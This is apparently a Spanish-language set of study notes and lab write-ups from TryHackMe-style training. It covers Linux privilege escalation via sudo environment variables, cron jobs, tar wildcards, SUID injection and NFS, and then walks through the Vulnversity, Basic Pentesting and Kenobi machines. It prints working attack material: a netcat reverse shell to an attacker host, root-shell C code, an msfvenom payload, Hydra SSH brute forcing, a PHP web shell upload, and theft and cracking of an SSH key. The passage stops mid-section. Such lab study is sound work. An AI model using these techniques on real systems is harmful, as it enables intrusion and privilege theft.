Sin embargo, sudo puede ser configurado para heredar ciertas variables de entorno del usuario que lo invoca trasladando así parte del mencionado entorno al entorno del segundo usuario.

Estas variables heredadas pueden verse a través del comando *sudo -l* en *env_keep+* (enviroment keep):

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220803170213.png' | relative_url }}" text-align="center"/>
</div>

En la imagen anterior podemos comprobar que se heredan dos variables; LD_PRELOAD y LD_LIBRARY_PATH, ambas son variables que se ocupan de contener rutas a librerias u objetos compartidos que se cargarán antes que ninguna otra libreria.

Esto puede aprovecharse de la siguiente manera:

- En primer lugar, creamos un código en C para crear un objeto que abra una terminal:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220803174247.png' | relative_url }}" text-align="center"/>
</div>

- Seguidamente, construimos un objeto compartido con dicho código:

```bash
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
```

- Por último, corremos un programa con sudo cargando el objeto compartido que hemos creado

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220803174820.png' | relative_url }}" text-align="center"/>
</div>

La lógica está en que el código del objeto se carga antes que nada y de ahí que se abra una shell como root.

Para la segunda variable aplica algo parecido, podemos hacer que durante la ejecución de un programa se carge una librería maliciosa construida por nosotros importándola mediante la variable de entorno LD_LIBRARY_PATH.

- En primer lugar, sabemos que podemos ejecutar "apache2" con sudo sin poner contraseña. Con el comando

```bash
ldd /usr/sbin/apache2
```

Vemos las librerias que acompañan al programa:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220803180417.png' | relative_url }}" text-align="center"/>
</div>

De esta forma, empleamos el siguiente código:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220803181834.png' | relative_url }}" text-align="center"/>
</div>

que abre una terminal para construir un objeto que se llame como una de las librerías que acompañan al programa:

```bash
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
```

Y seguidamente ejecutamos apache2 con sudo importando el objeto mediante la variable de entorno:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220803182204.png' | relative_url }}" text-align="center"/>
</div>

De nuevo, la lógica es la misma, se importa mediante la variable de entorno una librería que se ejecuta antes que ninguna otra.

<br />

**Cron jobs - file permissions**

Recordamos que los *cron jobs* son programas o scripts que los usuarios pueden configurar para que se ejecuten cuando lo deseen o periodicamente. Estos cronjobs están configurados desde el fichero "crontab" en el directorio /etc.

De esta forma, inspeccionamos el contenido de /etc/crontab y encontramos que existe un script, world-writeable, que ejecuta root:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220803190736.png' | relative_url }}" text-align="center"/>
</div>

Así, lo sobreescribimos con un código para obtener una reverse shell:

```bash
#!/bin/bash
nc <kali-IP> <PORT> -e /bin/bash
```

Seguidamente guardamos e iniciamos un listener en nuestra máquina local:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220803191509.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Cron Jobs - PATH Environment Variable**

Volviendo al caso anterior, también podemos sacar partido del esquema anterior observando también la variable PATH del propio fichero:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220803193714.png' | relative_url }}" text-align="center"/>
</div>

Observamos que la primera ruta de la variable es un diectorio en el que tenemos permisos de escritura y de nuevo, crontab tiene descrito que root ejecute "overwrite.sh".

Podemos por tanto hacer un ejecutable con el mismo nombre en /home/user y se ejecutará por root antes que el auténtico overwrite.sh:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220803193517.png' | relative_url }}" text-align="center"/>
</div>

Y seteamos un listener en nuestra kali:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220803193613.png' | relative_url }}" text-align="center"/>
</div>

Obteniendo una shell como root.

<br />

**Cron Jobs - Wildcards**

Ahora vamos a ver una forma de inyectar código aprovechándonos de una caracter especial, el '\*' el cual por si mismo incluye todos los elementos posibles dentro de un directorio.

Por otra parte, tenemos un script, compress.sh:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220804092259.png' | relative_url }}" text-align="center"/>
</div>

Por desgracia no podemos modificarlo, sin embargo, podemos tener en cuenta un detalle y es que el comando tar se llama con un '\*' esto provoca que se incluya el nombre de cualquier fichero en la propia línea, así, podríamos introducir un fichero cuyo nombre se entendiera como un comando de tar.

Concretamente, tenemos en GTFOBins:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220804093144.png' | relative_url }}" text-align="center"/>
</div>

De esta forma, podemos ejecutar con tar un fichero añadiendo los atributos adecuados. Así, construimos el siguiente fichero:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220804094146.png' | relative_url }}" text-align="center"/>
</div>

Le damos permisos de ejecución y activamos un listener en nuestra máquina local y seguidamente creamos dos ficheros cuyos nombres se corresponden con los atributos que necesitamos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220804094426.png' | relative_url }}" text-align="center"/>
</div>

De esta forma, y como ya hemos comentado, el asterísco incluirá ambos nombres en la línea de comando de tar provocando la ejecución del fichero que contiene la reverse shell por parte de root, dándonos una shell como super usuario:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220804094757.png' | relative_url }}" text-align="center"/>
</div>

<br />

**SUID / SGID Executables - Known Exploits**

Existen ejecutables que poseen el bit SUID/SGID y pueden ser accionados como el usuario o grupo propietario del mismo. Especialmente interesante cuando este es root.

Algunos, poseen exploits conocidos que pueden obtener fácilmente. Por ejemplo, en primer lugar listamos todos los ficheros SUID/SGID de la máquina:

```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220804122555.png' | relative_url }}" text-align="center"/>
</div>

Observamos que existe un ejecutable denominado como exim-4.84-3, se trata de un agente de transferencia de mails para sistemas basados en Unix.

Investigando en internet llegamos a: https://www.exploit-db.com/exploits/39535, podemos encontrar una copia en el directorio tools de la máquina vulnerable Debian:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220804124429.png' | relative_url }}" text-align="center"/>
</div>

De forma que corremos el exploit para obtener una shell:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220804124524.png' | relative_url }}" text-align="center"/>
</div>

<br />

**SUID / SGID Executables - Shared Object Injection**

Sabemos que un programa cuando se ejecuta no sólo ejecuta el código del fichero en sí sino que también ejecuta código foráneo en forma de objetos o librerías compartidas.

La ejecución de objetos compartidos es un tipo de exploit que consiste en cambiar una de las partes de código que se importan por código malicioso que se ejecuta junto con el programa.

Veámos un ejemplo de este tipo de vulnerabilidad y de cómo guarda relación con el SUID/SGID bit.

En la máquina actual tenemos un fichero: /usr/local/bin/suid-so, que es vulnerable a la injección de objetos compartidos.

En primer lugar, algo que delata que descarga librerías es que tiene un proceso de ejecución remcarcado mediante una barra que se llena conforme este se completa:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220804151350.png' | relative_url }}" text-align="center"/>
</div>

Para hacer un seguimiento del código que se ejecuta conforme se acciona el programa empleamos "strace", que es una herramienta de debugging. Concretamente, vamos a buscar los términos open, access o no such file en el output de esta herramienta:

```bash
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220804152220.png' | relative_url }}" text-align="center"/>
</div>

Esto nos da un listado de las librerías que se cargan o más bien del código que se importa. Concretamente vemos que intenta abrir un /home/user/.config/libcalc.so pero no encuentra el fichero.

Así, construimos un objeto en C para spawnear una shell a partir del código:

```bash
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
setuid(0);
system("/bin/bash -p");
}
```

Y el siguiente comando:

```bash
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
```

Ejecutamos el script:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220804155932.png' | relative_url }}" text-align="center"/>
</div>

<br />

**SUID / SGID Executables - Environment Variables**

En algunas ocasiones, podemos encontrar pistas dentro de un ejecutable ya sea en estático o durante su ejecución, que nos pueden llevar a una estrategia de ataque.

Veámos por ejemplo el fichero /usr/local/bin/suid-env, este puede ser explotable gracias a la herencia del valor de la variable PATH en combinación con un mal uso de ciertos comandos.

En primer lugar, ejecutamos el fichero y observamos que intenta iniciar el servicio apache2, seguidamente empleamos el comando "string" para que nos saque las líneas legibles del binario:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220804185601.png' | relative_url }}" text-align="center"/>
</div>

Podemos observar que después de procesar cierto código y llamar a ciertas librerías ejecuta "service apache2 start" sin escribir la ruta absoluta del comando "service" de forma que hace uso de la variable PATH del usuario que ejecuta el comando.

Al desplegar la variable PATH y la localización del ejecutable service original obtenemos de que existen varias rutas que preceden a la ruta de localización de dicho ejecutable:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220804190927.png' | relative_url }}" text-align="center"/>
</div>

Esto en combinación con el bit SUID que el fichero tiene incorporado y que sea propiedad de root:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220804191558.png' | relative_url }}" text-align="center"/>
</div>

Nos lleva a la siguiente estrategía, creamos un ejecutable service malicioso y añadimos el directorio actual a la variable PATH

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220804195220.png' | relative_url }}" text-align="center"/>
</div>

y ejecutamos el binario que se ejecutará como root dándonos una shell.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220804195240.png' | relative_url }}" text-align="center"/>
</div>

<br />

**SUID / SGID Executables - Abusing Shell Features**

En versiones de Bash inferiores a 4.2-048 es posible definir funciones de shell con nombres que rehacen rutas a ficheros. Al exportar estas funciones, también se exportan las rutas cambiadas que se utilizan en lugar de las rutas originales.

De esta forma, en primer lugar tenemos un fichero ejecutable en la ruta: /usr/local/bin/suid-env2, la cual tiene el mismo contenido que /usr/local/bin/suid-env pero esta vez emplea el término "service" con la ruta completa.

Verificamos la versión de Bash que tenemos instalada en la máquina Debian:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220805092912.png' | relative_url }}" text-align="center"/>
</div>

Y observamos que hay una versión inferior a la mencionada anteriormente. De esta forma creamos una función de Bash llamada: /usr/sbin/service

```bash
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
```

que ejecuta una nueva sessión de bash y lo exportamos. Esto en conjunción con que el fichero tiene un bit SUID

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220805094037.png' | relative_url }}" text-align="center"/>
</div>

y es propiedad de root nos dará una shell con más privilegios:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220805094149.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Passwords & Keys - History Files**

Puede ocurrir que un usuario sin querer escriba su contraseña en la línea de comando en lugar del campo password y en dicho caso quedará registrado en el historial:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220805120512.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Passwords & Keys - Config Files**

A menudo, algunos ficheros de configuración contienen contraseñas en texto plano o en otros formatos reversibles.

Así, investigamos el directorio home de un usuario:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220805120819.png' | relative_url }}" text-align="center"/>
</div>

Y observamos que existe una referencia a un archivo que puede contener información sensible:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220805120857.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Password & Keys - SSH Keys**

A veces, los usuarios hacen copias de seguridad de archivos importantes pero no los protegen con los permisos correctos.

Por ejemplo, pueden dejar sin securizar las llaves de SSH de forma que estas sean accesibles:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220805131148.png' | relative_url }}" text-align="center"/>
</div>

<br />

**NFS**

Recordamos que NFS son las siglas de Network File System y es un protocolo de transporte que comparte ficheros haciéndolos accesibles mediante un punto de montaje en la máquina de destino.

Los archivos creados a través de NFS heredan la ID del usuario remoto. Si el usuario es root y el root squashing está habilitado, el ID se establecerá en el usuario "nadie".

Sin embargo, en nuestra máquina la carpeta /tmp tiene una partición aparte que es fundamentalmente insegura:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220805135935.png' | relative_url }}" text-align="center"/>
</div>

De esta forma, llevamos a cabo la siguiente estrategia, construimos desde la máquina Kali un punto de montaje en la carpeta /tmp con un archivo world-executable y con el bit SUID propiedad de root en dicho punto de montaje para abrir una shell.

Esto lo llevamos en los siguientes pasos:

- En primer lugar nos aseguramos de ser root, creamos un directorio dentro de la carpeta /tmp y lo compartimos con la máquina de destino:

```bash
mkdir /tmp/nfs
mount -o rw,vers=2 <server-IP>:/tmp /tmp/nfs
```

- Seguidamente, empleando msfvenom creamos un archivo ejecutable para abrir una shell:

```bash
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
```

Y le damos permisos de ejecución y el bit SUID.

```bash
chmod +xs /tmp/nfs/shell.elf
```

- Por último, desde la debian accedemos a la carpeta compartida y, gracias a la malconfiguración de la carpeta tmp que no tiene *root_squashing* nos encontramos con un fichero ejecutable propiedad de root con el bit SUID que despliega una shell:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220805142618.png' | relative_url }}" text-align="center"/>
</div>

### 7. Basic computes explotation.

#### 7.1. Vulnversity.

**Intro**

 Active recon, web app attacks and privilege escalation.

**Reconnaissance**

En primer lugar y con la IP de la máquina realizamos un escaneo de puertos:

- Podemos observar con el comando:

```bash
nmap 10.10.158.128 -sT -p- -T5 -vv
```

- *-sT*: Realizar un escaneo TCP.
- *-p-*: Todos los puertos.
- *-T5*: Velocidad del escaneo.
- *-vv*: Double verbose.

Obtenemos que hay 6 puertos abiertos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220805153348.png' | relative_url }}" text-align="center"/>
</div>

- Nos llama la atención el puerto 3128/tcp que contiene el servicio *squid-http*. [Squid](http://www.squid-cache.org/) es un servicio que hace la función de proxy para una aplicación web. Queremos obtener la versión del servicio mediante el comando:

```bash
nmap <SERVER-IP> -sV -p3128 -T5 -vv
```

- *-sV*: Obtener la versión del servicio.
- *-p\<PORT>*: Puerto a escanear o rango de puertos con un guíon entre la 'p' y el puerto.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220805154709.png' | relative_url }}" text-align="center"/>
</div>

- Mediante el modificador -O podemos observar que el sistema operativo con toda probabilidad es un flavour de Linux. Concretamente, observando la versión del servicio SSH:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220805155922.png' | relative_url }}" text-align="center"/>
</div>

- Por último, el servicio web corre en el 3333.

<br />

**Locating directories using GoBuster**

Sabiendo que estamos ante una máquina que tiene un servicio web, vamos a intentar mapear el sitio empleando GoBuster con la finalidad de encontrar algún sitio de interés.

Go Buster por su parte es una herramienta de escaneo/mapeo de sitios web basado en ataques de fuerza bruta por diccionario:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220805161708.png' | relative_url }}" text-align="center"/>
</div>

Podemos descargar esta herramienta desde [aquí](https://github.com/OJ/gobuster)

Aunque, también podemos emplear una herramienta más sencilla en su lugar llamada *Dirb* instalada por defecto en Kali:

```bash
dirb http://10.10.158.128:3333/ -w /usr/share/wordlists/rockyou.txt
```

Obteniendo:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220805163157.png' | relative_url }}" text-align="center"/>
</div>

Luego la página /internal/ posee una funcionalidad de subida de ficheros tal y como nos indica nuestra herramienta de escaneo.

<br />

**Compromise the webserver**

Ahora que hemos encontrado una página donde poder intentar subir una webshell, veámos si podemos subir un fichero php descargado desde [aqui](https://github.com/xdayeh/Php-Reverse-Shell/).

Sin embargo, al intentar subirla obtenemos que la extensión está bloqueada:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220805170123.png' | relative_url }}" text-align="center"/>
</div>

Para ver qué extensiones están bloqueadas vamos a proceder a fuzzear la funcionalidad de upload mediante el Intruder de BurpSuite.

Para ello, abrimos BurpSuite, acudimos a la sección de la página de subidas e intereceptamos la subida del fichero:

- Configuramos firefox para que escuche a través del proxy de burpsuite:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220805172608.png' | relative_url }}" text-align="center"/>
</div>

- Activamos el proxy para que intercepte requests:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220805172703.png' | relative_url }}" text-align="center"/>
</div>

- Y subimos un fichero:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220805172735.png' | relative_url }}" text-align="center"/>
</div>

Así, nos encontraremos con que nos saltará una pestaña de BurpSuite con el contenido del fichero que vamos a enviar, entre los datos aparece el nombre del mismo junto con la extensión:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220805173026.png' | relative_url }}" text-align="center"/>
</div>

De esta forma, lo enviamos al BurpIntruder:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220805173059.png' | relative_url }}" text-align="center"/>
</div>

Elegimos el tipo de ataque "Sniper" y una localización para payloads:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220805173123.png' | relative_url }}" text-align="center"/>
</div>

Creamos además una lista de nombres para posibles candidatos a ser admitidos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220805173243.png' | relative_url }}" text-align="center"/>
</div>

Y lanzamos el ataque. Examinando las respuestas obtenemos que el aceptado es .phtml:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220805173541.png' | relative_url }}" text-align="center"/>
</div>

Así, optimizamos el código con nuestra IP y el puerto adecuado:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220805174110.png' | relative_url }}" text-align="center"/>
</div>

Cambiamos la extensión del archivo e iniciamos un listener de netcat en nuestra máquina local:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220805174212.png' | relative_url }}" text-align="center"/>
</div>

Seguidamente, subimos el fichero y acudimos a :

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220805174357.png' | relative_url }}" text-align="center"/>
</div>

Obteniendo:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220805174407.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Privilege Escalation**

Vamos a proceder a escalar privilegios mediante un archivo con el bit de SUID.

En primer lugar, dentro del sistema comprometido nos proponemos buscar todos los archivos que contienen un bit SUID:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220805183601.png' | relative_url }}" text-align="center"/>
</div>

Entre ellos, tal y como se puede ver en la imagen, se encuentra "systemctl" el cual podemos emplear para elevar privilegios.

Para ello acudimos a [GTFOBins](https://gtfobins.github.io/):

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220805185040.png' | relative_url }}" text-align="center"/>
</div>

Así, seleccionamos el siguiente código:

```bash
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "<COMMAND> > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF
```

Lo introducimos en un script y lo ejecutamos, donde cambiamos \<COMMAND> por el comando a ejecutar que es "cat /root/root.txt":

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220805190320.png' | relative_url }}" text-align="center"/>
</div>

<br />

#### 7.2. Basic Pentesting.

**Intro**

Brute forcing, hash cracking, service enumeration, Linux Enumeration.

<br />

**Web App Testing & Privilege Escalation**

En primer lugar, con la IP de la máquina llevamos a cabo un escaneo de puertos con Nmap:

```bash
nmap 10.10.200.93 -sT -p- -T5
```

Observamos que tiene, entre otros, una aplicación web hosteada, un servidor SSH y un servidor SMB:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220805211410.png' | relative_url }}" text-align="center"/>
</div>

En primer lugar, vamos a proceder a realizar un mapeo del sitio web con dirb y la lista de palabras, big.txt:

```bash
dirb http://10.10.200.93:80/ /usr/share/wordlists/dirb/big.txt
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220805211857.png' | relative_url }}" text-align="center"/>
</div>

Así, acudimos a dicha página a ver qué encontramos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220805212701.png' | relative_url }}" text-align="center"/>
</div>

Encontramos dos ficheros con texto legible que se traduce en una conversación entre dos usuarios en la que se mencionan dos detalles importantes. La existencia de un servidor SMB y que el usuario J tiene credenciales débiles, vulnerables al cracking simple y probablemente al brute forcing.

En primer lugar pasamos a explorar el servidor SMB.

- Lanzamos la herramienta "enum4linux":

```bash
enum4linux -a <IP>
```

La opción "-a" volcará todo el contenido. Una vez lo tengamos desplegado veremos tres detalles importantes:

- Uno de los nombres conocidos es "guest"

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220805213835.png' | relative_url }}" text-align="center"/>
</div>

- Existe un share llamado Anonymous que intuitivamente será accesible por el usuario guest:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220805213908.png' | relative_url }}" text-align="center"/>
</div>

- Por último, tendremos acceso a los dos nombres de usuario del sistema: kay y jan

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220805214031.png' | relative_url }}" text-align="center"/>
</div>

- De esta forma, empleamos el comando "smbclient" para introducirnos dentro del share "Anonymous" con el usuario "guest" y ver si hay información relevante:

```bash
smbclient //10.10.200.93/Anonymous -U guest
```

Accedemos sin contraseña y dentro encontramos un documento donde se repiten los nombres de usuario ya mencionados antes:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220805214333.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220805214442.png' | relative_url }}" text-align="center"/>
</div>

Así, queda claro que ya tenemos un nombre de usuario, Jan que seguro posee unas credenciales débiles. Vamos a explotar esto haciendo uso de la herramienta Hydra sobre el servicio SSH que sabemos que tiene abierto mediante la lista rockyou.txt:

```bash
hydra -P /usr/share/wordlists/rockyou.txt -l jan <IP> ssh -t 64 -v
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220805222843.png' | relative_url }}" text-align="center"/>
</div>

Y por tanto nos logeamos en la máquina como "jan:armando":

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220805223229.png' | relative_url }}" text-align="center"/>
</div>

Asi, ahora realizamos una enumeración sobre posibles vectores de elevación de privilegios.

En primer lugar, algo que merece la pena probar es comprobar si tenemos acceso a las sshkeys de otros posibles usuarios:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220805223357.png' | relative_url }}" text-align="center"/>
</div>

De esta forma, montamos un servidor de Python

```bash
python -m SimpleHTTPServer
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220805223457.png' | relative_url }}" text-align="center"/>
</div>

Y de ahí, descargamos las llaves con wget en nuestra kali:

```bash
wget http://10.10.200.93:8000/id_rsa
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220805223713.png' | relative_url }}" text-align="center"/>
</div>

Y le damos los permisos adecuados (si no dará error, la llave sólo puede ser leída/escribible por su propietario) a la llave e intentamos logearnos como kay, sin embargo, observamos que nos pide su passphrase:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220805232252.png' | relative_url }}" text-align="center"/>
</div>

Para obtenerla, recordamos partes anteriores sobre cómo crakear la passphrase de una key con ssh2john:

- Utilizamos el comando ssh2john sobre dicho fichero de texto (podemos descargarnos la herramienta desde [aqui](https://github.com/openwall/john)):

```bash
python john/run/ssh2john.py id_rsa > output.txt
```

- Y ahora le pasamos el fichero output.txt a john para que lo descifre:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220805234128.png' | relative_url }}" text-align="center"/>
</div>

Ahí obtenemos que la passphrase es beeswax:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220805234228.png' | relative_url }}" text-align="center"/>
</div>

De forma que el contenido del pass.bak es:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220805234330.png' | relative_url }}" text-align="center"/>
</div>

<br />

#### 7.3. Kenobi.

**Intro**

Esta máquina cubre acceso a shares de Samba, manipulación de versiones vulnerable s de proftpd para ganar acceso inicial y escalar privilegios a root vía SUID binaries.

<br />

**Enumerating Samba for shares**

Samba es una suite de programas interoperantes entre Windows y sistemas basados en Unix que permite compartir recursos entre usuarios tales como ficheros, impresoras, etc a lo largo de una red.

Por su parte, Samba está basado en el protocolo SMB, de esquema cliente-servidor para sistemas Windows, que atiende generalmente los puertos 139/tcp y 445/tcp. De ahí la importancia de Samba, sin ella, Windows estaría aislado del resto de sistemas operativos. Como sabemos, los sistemas más modernos operan sobre el puerto 445.

Vamos a emplear unos scripts de nmap para llevar a cabo una enumeración de los shares de SMB:

```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <Server-IP>
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220806134027.png' | relative_url }}" text-align="center"/>
</div>

En esta enumeración se puede observar que existe un share, "Anonymous" accesible desde el usuario "guest" que posee permisos de lectura/escritura. Vamos a emplear la herramienta "smbclient" para acceder a dicho dispositivo:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220806134957.png' | relative_url }}" text-align="center"/>
</div>

Se nos permite el acceso sin contraseña.

Una vez dentro, empleamos el comando "dir" para listar los contenidos del directorio y encontramos un fichero, log.txt:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220806140448.png' | relative_url }}" text-align="center"/>
</div>

Al que podemos acceder con "more log.txt" y nos encontramos con un fichero que tiene información sobre una SSH key que Kenobi ha creado e información sobre el ProFTPD server (un servidor FTP open-source):

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220806143432.png' | relative_url }}" text-align="center"/>
</div>

Observamos que el usuario de la máquina que gestiona el FTP Server es Kenobi.

Además, en nuesto escaneo previo con nmap vimos en uso el puerto 111/tcp con el servicio rpcbind (RPC atiende a Remote Procedure Call y es un protocolo de comunicación entre un programa y un servicio que se encuentra en otra localización). Es decir, que en el puerto 111/tcp tenemos un servidor que redirecciona nuestra petición sobre otro servicio en una localización distinta. Para ver de qué servicio se trata procedemos a utilizar nmap:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220806171238.png' | relative_url }}" text-align="center"/>
</div>

En la imágen podemos observar que gestiona el acceso a una serie de servicios entre los que se encuentra un servidor NFS (Network File System), para obtener información sobre qué se comparte en dicho servidor empleamos los scripts de nmap de nfs:

```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <IP>
```

Al lanzar el comando observamos que comparte la partición /var:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220806172922.png' | relative_url }}" text-align="center"/>
</div>

De momento vamos a intentar acceder al ProFTPD server en busca de más información. Para ello nos conectamos con Netcat:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220806153401.png' | relative_url }}" text-align="center"/>
</div>

Observamos que la versión del servidor es la 1.3.5. Empleamos "searchsploit" para buscar posibles exploits para dicha versión en nuestra máquina kali:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220806153806.png' | relative_url }}" text-align="center"/>
</div>

Entre ellos tiene especial interés el [mod_copy module](http://www.proftpd.org/docs/contrib/mod_copy.html) que permite a un usuario no autenticado copiar ficheros de un directorio a otro mediante los comandos SITE CPFR (Copy From) SITE CPTO (Copy To).

Esto es especialmente relevante enlazandolo con el servidor NFS y las llaves SSH descubiertas al inicio. Podemos extraer el contenido de las SSHKey del usuario kenobi moviéndola hasta la partición /var y serguidamente conectándonos al NFS Server y coger la clave para logearnos como Kenobi:

- Así, en primer lugar, nos conectamos con Netcat al servidor FTP y empleamos los comando adheridos al modulo para mover el fichero de sitio:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220806174736.png' | relative_url }}" text-align="center"/>
</div>

Observamos que lo introducimos en /var/tmp porque esa carpeta concede world-writeable rights a cualquier usuario o programa.

- Seguidamente, creamos la carpeta /var/kenobiNFS y en ella utilizamos el comando "mount" para crear un punto de montaje en esa carpeta con el directorio compartir del NFS Server del servidor Kenobi:

```bash
mkdir /mnt/kenobiNFS
mount machine_ip:/var /mnt/kenobiNFS
ls -la /mnt/kenobiNFS
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220806175807.png' | relative_url }}" text-align="center"/>
</div>

- Así, todo lo que queda es logearse con las SSHKey de Kenobi:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220806180046.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Privilege Escalation with Path Variable Manipulation**

Ahora que tenemos acceso a la máquina, vamos a intetnar escalar privilegios mediante algún fichero SUID.

Listamos todos los ficheros SUID mediante el comando:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Al listar y explorar algunos ficheros con GTFOBins, no encontramos nada útil salvo algo que parece un ejecutable construido de forma manual:

<div style="text-align:center">
